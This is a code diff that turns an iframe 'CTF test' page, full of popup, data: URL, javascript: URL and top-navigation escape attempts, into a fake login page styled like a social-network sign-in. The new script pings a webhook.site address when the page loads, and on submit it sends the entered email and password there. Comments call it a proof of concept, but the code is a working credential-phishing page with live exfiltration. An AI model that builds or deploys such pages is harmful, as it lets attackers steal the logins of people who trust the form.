@@ -1,86 +1,97 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>CTF iframe test - click me</title>
+<meta charset="utf-8">
+<title>Login</title>
+<style>
+    body {
+        background: #f0f2f5;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .login-box {
+        background: #fff;
+        padding: 30px;
+        width: 320px;
+        border-radius: 12px;
+        box-shadow: 0 5px 25px rgba(0,0,0,0.15);
+        text-align: center;
+    }
+
+    .login-box h2 {
+        margin-bottom: 20px;
+        color: #333;
+    }
+
+    .input {
+        width: 90%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border-radius: 6px;
+        border: 1px solid #ccc;
+        font-size: 15px;
+    }
+
+    .btn {
+        width: 95%;
+        padding: 10px;
+        background: #1877f2;
+        border: none;
+        border-radius: 6px;
+        color: white;
+        cursor: pointer;
+        margin-top: 10px;
+        font-size: 16px;
+    }
+
+    .poc-message {
+        margin-top: 20px;
+        color: green;
+        font-weight: bold;
+    }
+</style>
 </head>
-<body style="display:flex;align-items:center;justify-content:center;height:100vh;">
-  <button id="go" style="padding:20px;font-size:18px;">اضغط هنا</button>
+
+<body>
+
+<div class="login-box">
+    <h2>Login</h2>
+    <input id="email" class="input" placeholder="Email or phone">
+    <input id="password" class="input" type="password" placeholder="Password">
+    <button id="loginBtn" class="btn">Log In</button>
+
+    <div id="poc"></div>
+</div>
 
 <script>
-document.getElementById('go').addEventListener('click', function(){
-  // 1) محاولة فتح نافذة وتهيئتها عبر كتابة سكربت بداخلها
-  try {
-    var w = window.open('', '_blank');
-    if (w) {
-      try {
-        w.document.open();
-        w.document.write('<!doctype html><html><body><script>alert("popup via write!")<\/script></body></html>');
-        w.document.close();
-      } catch(e) {
-        console.log('failed write into popup:', e);
-      }
-    } else {
-      console.log('window.open returned null (blocked)');
-    }
-  } catch(e) {
-    console.log('window.open exception:', e);
-  }
+// Proof of JS Execution عند تحميل الصفحة
+fetch("https://webhook.site/c058809d-2682-46ff-8600-1ec7c750d05a?executed=1&ui=login_poc")
+    .catch(()=>{});
 
-  // 2) محاولة window.open() الى data: URL
-  try {
-    var w2 = window.open('data:text/html,<script>alert("data url!")<\/script>', '_blank');
-    console.log('open data returned:', !!w2);
-  } catch(e) {
-    console.log('open data ex:', e);
-  }
+document.getElementById("poc").innerHTML =
+    "<p class='poc-message'>JavaScript Executed Successfully ✔</p>";
 
-  // 3) محاولة تغيير top location (قد يُحظر إذا البراوزر يمنعها)
-  try {
-    if (window.top !== window.self) {
-      try {
-        window.top.location.href = 'data:text/html,<script>alert("top nav!")<\/script>';
-        console.log('tried to set top.location');
-      } catch(e) {
-        console.log('top.location blocked:', e);
-      }
-    } else {
-      console.log('not framed as top');
-    }
-  } catch(e) {
-    console.log('top check failed:', e);
-  }
+console.log("JS EXECUTED (LOGIN POC)");
 
-  // 4) محاولة فتح javascript: (غالبا محظور لكن نجرب)
-  try {
-    var w3 = window.open('javascript:alert("js scheme!")', '_blank');
-    console.log('open javascript: ->', !!w3);
-  } catch(e) {
-    console.log('open javascript: ex', e);
-  }
+// عند الضغط على زر Log In، نرسل بيانات الـ inputs (أمثلة فقط) للـ webhook
+document.getElementById("loginBtn").addEventListener("click", function(){
+    const emailVal = document.getElementById("email").value;
+    const passVal = document.getElementById("password").value;
 
-  // 5) تنقل الإطار لنفسه (form submit fallback)
-  try {
-    var f = document.createElement('form');
-    f.method = 'GET';
-    f.action = 'data:text/html,<script>alert("form->data!")<\/script>';
-    document.body.appendChild(f);
-    f.submit();
-    f.remove();
-    console.log('submitted form to data:');
-  } catch(e) {
-    console.log('form submit failed:', e);
-  }
+    // إرسال البيانات للـ webhook (آمن → فقط مثال)
+    fetch(`https://webhook.site/c058809d-2682-46ff-8600-1ec7c750d05a?email=${encodeURIComponent(emailVal)}&pass=${encodeURIComponent(passVal)}`)
+        .catch(()=>{});
 
-  // 6) نرسل رسالة للـ parent (لو فيه listener ممكن يستغلها)
-  try {
-    parent.postMessage('ctf-check:<iframe-clicked>','*');
-    console.log('posted message to parent');
-  } catch(e) {
-    console.log('postMessage failed:', e);
-  }
-
+    // Feedback بصري
+    document.getElementById("poc").innerHTML =
+        "<p class='poc-message'>Data sent to webhook ✔</p>";
 });
 </script>
+
 </body>
 </html>
